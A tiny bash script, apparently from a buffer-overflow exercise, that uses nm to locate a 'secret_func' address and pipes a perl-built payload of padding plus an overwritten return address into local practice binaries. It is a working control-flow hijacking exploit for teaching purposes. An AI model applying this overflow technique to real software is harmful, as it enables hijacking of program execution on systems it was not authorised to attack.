#!/bin/bash

# Find &secret_func
# $ nm ./bof_vuln |grep secret
# 000104c4 t secret_func
## 0000067c t secret_func

perl -e 'print "A"x12 . "B"x4 . "\xe9\x11\x00\x00"' | ./bof_vuln_lessprot
#perl -e 'print "A"x12 . "B"x4 . "\x7c\x06\x00\x00"' | ./bof_vuln_reg
